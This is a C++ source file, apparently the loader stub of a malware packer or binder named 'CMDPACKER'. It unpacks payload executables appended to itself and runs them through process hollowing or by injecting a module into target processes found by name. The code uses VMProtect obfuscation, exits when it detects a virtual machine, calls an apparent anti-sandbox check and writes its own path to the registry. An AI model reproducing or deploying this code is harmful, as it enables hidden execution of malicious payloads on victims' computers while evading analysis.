#include "stdafx.h"
#include "Base.h"
#include <map>
BOOL cmd_binder(LPCTSTR lpszPackFile)
{
	//
	VMProtectBegin(__FUNCTION__);
	//	WProtectBegin();
	BOOL bRet = FALSE;
	//TCHAR szTempName[MAX_PATH] = { 0 };
	//TCHAR szTempPath[MAX_PATH] = { 0 };
	//GetTempPath(MAX_PATH, szTempPath);
	//GetTempFileName(szTempPath, _T("1"), 0, szTempName);
	CConfigData cfg;
	CONFIG_DATA cfgdata;
	if (cfg.LoadConfig(lpszPackFile, &cfgdata, sizeof(CONFIG_DATA)))
	{
		if (cfgdata.TotalSize > sizeof(CONFIG_DATA))
		{
			auto pBuffer = malloc(cfgdata.TotalSize);
			if (pBuffer)
			{
				PVOID pakFile1 = NULL;
				PVOID pakFile2 = NULL;
				if (cfg.LoadConfig(lpszPackFile, pBuffer, cfgdata.TotalSize))
				{
					pakFile1 = (PVOID)((ULONG_PTR)pBuffer + sizeof(CONFIG_DATA));
					pakFile2 = (PVOID)((ULONG_PTR)pBuffer + sizeof(CONFIG_DATA) + cfgdata.PakSize1);
					PVOID ldrfile1 = NULL;
					PVOID ldrfile2 = NULL;
					SIZE_T ldrfile_size1 = 0;
					SIZE_T ldrfile_size2 = 0;
					if (pak_decompress(pakFile1, cfgdata.PakSize1, &ldrfile1, &ldrfile_size1)
						&& pak_decompress(pakFile2, cfgdata.PakSize2, &ldrfile2, &ldrfile_size2))
					{
						PVOID pefile1 = NULL;
						UINT pefile_size1 = 0;
						PVOID pefile2 = NULL;
						UINT pefile_size2 = 0;
						if (Ldr2PeFile(ldrfile1, &pefile1, ldrfile_size1, &pefile_size1)
							&& Ldr2PeFile(ldrfile2, &pefile2, ldrfile_size2, &pefile_size2))
						{
							//WriteToFile(szTempName, pefile1, pefile_size1);
							//这里注入EXE
							auto get_replace_info = [](NewProcessInfo *new_process_info, PVOID filedata, UINT file_size) {
								new_process_info->pFileData = std::unique_ptr<BYTE[]>(new BYTE[file_size]);
								new_process_info->dwFileSize = file_size;
								RtlCopyMemory(new_process_info->pFileData.get(), filedata, file_size);
								new_process_info->pDosHeader =
									(PIMAGE_DOS_HEADER)(&new_process_info->pFileData[0]);
								new_process_info->pNtHeaders =
									(PIMAGE_NT_HEADERS)(&new_process_info->pFileData[new_process_info->pDosHeader->e_lfanew]);
							};
							{
								NewProcessInfo newProcessInfo = { 0 };
								get_replace_info(&newProcessInfo, pefile2, pefile_size2);
								auto processInfo = MapTargetProcess(newProcessInfo, (LPSTR)lpszPackFile);
								bRet = RunTargetProcess(newProcessInfo, processInfo);
							}
							{
								NewProcessInfo newProcessInfo = { 0 };
								get_replace_info(&newProcessInfo, pefile1, pefile_size1);
								auto processInfo = MapTargetProcess(newProcessInfo, (LPSTR)lpszPackFile);
								bRet &= RunTargetProcess(newProcessInfo, processInfo);
							}
						}
						if (pefile1)
						{
							free(pefile1);
						}
						if (pefile2)
						{
							free(pefile2);
						}
					}
					if (ldrfile1)
					{
						VirtualFree(ldrfile1, 0, MEM_RELEASE);
					}
					if (ldrfile2)
					{
						VirtualFree(ldrfile2, 0, MEM_RELEASE);
					}
				}
				free(pBuffer);
			}
		}
	}
	//WProtectEnd();
	VMProtectEnd();
	return bRet;
}
BOOL cmd_exe(LPCTSTR lpszPackFile)
{
	//
	VMProtectBegin(__FUNCTION__);
	//	WProtectBegin();
	BOOL bRet = FALSE;
	TCHAR szTempName[MAX_PATH] = { 0 };
	TCHAR szTempPath[MAX_PATH] = { 0 };
	GetTempPath(MAX_PATH, szTempPath);
	GetTempFileName(szTempPath, _T("1"), 0, szTempName);
	CConfigData cfg;
	CONFIG_DATA cfgdata;
	if (cfg.LoadConfig(lpszPackFile, &cfgdata, sizeof(CONFIG_DATA)))
	{
		if (cfgdata.TotalSize > sizeof(CONFIG_DATA))
		{
			auto pBuffer = malloc(cfgdata.TotalSize);
			if (pBuffer)
			{
				PVOID pakFile1 = NULL;
				PVOID pakFile2 = NULL;
				if (cfg.LoadConfig(lpszPackFile, pBuffer, cfgdata.TotalSize))
				{
					pakFile1 = (PVOID)((ULONG_PTR)pBuffer + sizeof(CONFIG_DATA));
					pakFile2 = (PVOID)((ULONG_PTR)pBuffer + sizeof(CONFIG_DATA) + cfgdata.PakSize1);
					PVOID ldrfile1 = NULL;
					PVOID ldrfile2 = NULL;
					SIZE_T ldrfile_size1 = 0;
					SIZE_T ldrfile_size2 = 0;
					if (pak_decompress(pakFile1, cfgdata.PakSize1, &ldrfile1, &ldrfile_size1)
						&& pak_decompress(pakFile2, cfgdata.PakSize2, &ldrfile2, &ldrfile_size2))
					{
						PVOID pefile1 = NULL;
						UINT pefile_size1 = 0;
						PVOID pefile2 = NULL;
						UINT pefile_size2 = 0;
						if (Ldr2PeFile(ldrfile1, &pefile1, ldrfile_size1, &pefile_size1)
							&& Ldr2PeFile(ldrfile2, &pefile2, ldrfile_size2, &pefile_size2))
						{
							WriteToFile(szTempName, pefile1, pefile_size1);
							//这里注入EXE
							auto get_replace_info = [](NewProcessInfo *new_process_info, PVOID filedata, UINT file_size) {
								new_process_info->pFileData = std::unique_ptr<BYTE[]>(new BYTE[file_size]);
								new_process_info->dwFileSize = file_size;
								RtlCopyMemory(new_process_info->pFileData.get(), filedata, file_size);
								new_process_info->pDosHeader =
									(PIMAGE_DOS_HEADER)(&new_process_info->pFileData[0]);
								new_process_info->pNtHeaders =
									(PIMAGE_NT_HEADERS)(&new_process_info->pFileData[new_process_info->pDosHeader->e_lfanew]);
							};
							NewProcessInfo newProcessInfo = { 0 };
							get_replace_info(&newProcessInfo, pefile2, pefile_size2);
							auto processInfo = MapTargetProcess(newProcessInfo, szTempName);
							bRet = RunTargetProcess(newProcessInfo, processInfo);
						}
						if (pefile1)
						{
							free(pefile1);
						}
						if (pefile2)
						{
							free(pefile2);
						}
					}
					if (ldrfile1)
					{
						VirtualFree(ldrfile1, 0, MEM_RELEASE);
					}
					if (ldrfile2)
					{
						VirtualFree(ldrfile2, 0, MEM_RELEASE);
					}
				}
				free(pBuffer);
			}
		}
	}
	//	WProtectEnd();
	VMProtectEnd();
	return bRet;
}
BOOL cmd_dll(LPCTSTR lpszPackFile)
{
	//WProtectBegin();
	VMProtectBegin(__FUNCTION__);
	//	WProtectBegin();
	BOOL bRet = FALSE;
	//TCHAR szTempName[MAX_PATH] = { 0 };
	//TCHAR szTempPath[MAX_PATH] = { 0 };
	//GetTempPath(MAX_PATH, szTempPath);
	//GetTempFileName(szTempPath, _T("11"), 0, szTempName);
	CConfigData cfg;
	CONFIG_DATA cfgdata;
	if (cfg.LoadConfig(lpszPackFile, &cfgdata, sizeof(CONFIG_DATA)))
	{
		if (cfgdata.TotalSize > sizeof(CONFIG_DATA))
		{
			auto pBuffer = malloc(cfgdata.TotalSize);
			if (pBuffer)
			{
				PVOID pakFile1 = NULL;
				if (cfg.LoadConfig(lpszPackFile, pBuffer, cfgdata.TotalSize))
				{
					pakFile1 = (PVOID)((ULONG_PTR)pBuffer + sizeof(CONFIG_DATA));
					PVOID ldrfile1 = NULL;
					SIZE_T ldrfile_size1 = 0;
					if (pak_decompress(pakFile1, cfgdata.PakSize1, &ldrfile1, &ldrfile_size1))
					{
						PVOID pefile1 = NULL;
						UINT pefile_size1 = 0;
						if (Ldr2PeFile(ldrfile1, &pefile1, ldrfile_size1, &pefile_size1))
						{
							//遍历并注入!
							std::map<DWORD, DWORD> pid_map;
							while (1)
							{
								BOOL find = FALSE;
								GetAllProcess(cfgdata.szInjectTaget, pid_map);
								for (auto pid_item : pid_map)
								{
									if (pid_item.second == 1)
									{
										DWORD pid = pid_item.first;
										pid_map[pid] = 2;
										MemoryInjectModule(pid, pefile1);
										find = TRUE;
									}
								}
								if (find)
								{
									break;
								}
							}
						}
						if (pefile1)
						{
							free(pefile1);
						}

					}
					if (ldrfile1)
					{
						VirtualFree(ldrfile1, 0, MEM_RELEASE);
					}
				}
				free(pBuffer);
			}
		}
	}
	//	WProtectEnd();
	VMProtectEnd();
	return bRet;
}
const HKEY OpenRegistryKey(const char * const strKeyName, const bool bCreate = true)
{
	HKEY hKey = nullptr;
	DWORD dwResult = 0;

	LONG lRet = RegCreateKeyExA(HKEY_CURRENT_USER, strKeyName, 0,
		nullptr, 0, KEY_READ | KEY_WRITE | KEY_CREATE_SUB_KEY,
		nullptr, &hKey, &dwResult);
	if (lRet != ERROR_SUCCESS)
	{
		//fprintf(stderr, "Could not create/open registry key. Error = %X\n",
		//	lRet);
		//exit(-1);
		return NULL;
	}

	if (bCreate && dwResult == REG_CREATED_NEW_KEY)
	{
		//fprintf(stdout, "Created new registry key.\n");
	}
	else
	{
		//fprintf(stdout, "Opened existing registry key.\n");
	}

	return hKey;
}

void WriteRegistryKeyString(const HKEY hKey, const char * const strValueName,
	const BYTE *pBytes, const DWORD dwSize)
{
	//std::string strEncodedData = base64_encode(pBytes, dwSize);

	LONG lRet = RegSetValueExA(hKey, strValueName, 0, REG_SZ, (const BYTE *)pBytes, dwSize);
	if (lRet != ERROR_SUCCESS)
	{
		return;
	}
	return;
}
void cmd_analyer()
{
	VMProtectBegin(__FUNCTION__);
	//	WProtectBegin();
	TCHAR szFileName[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	//把路径写入注册表！
	
	CConfigData cfg;
	CONFIG_DATA cfgdata;
	auto ret = cfg.LoadConfig(szFileName, &cfgdata, sizeof(CONFIG_DATA));
	if (cfgdata.dwCmd == CMD_EXE)
	{
		auto hkey = OpenRegistryKey("CMDPACKER");
		if (hkey)
		{
			//MessageBox(NULL, _T("fff"), "d", MB_OK);
			WriteRegistryKeyString(hkey,"PATH",(const BYTE *)szFileName,sizeof(TCHAR)*(_tcslen(szFileName)+1));
			RegCloseKey(hkey);
		}
		cmd_exe(szFileName);
	}
	//if (cfgdata.dwCmd == CMD_DLL)
	//{
	//	GetAllPrivilege();
	//	cmd_dll(szFileName);
	//}
	if (cfgdata.dwCmd == CMD_BINDER)
	{
		//::VMDE
		if (IsRunInVM())
		{
			::ExitProcess(-1);
		}
		//::ASDE
		Asde();
		//MessageBox(NULL, _T("fucker"), _T("x"), MB_OK);
		cmd_binder(szFileName);
	}
	//WProtectEnd();
	VMProtectEnd();
}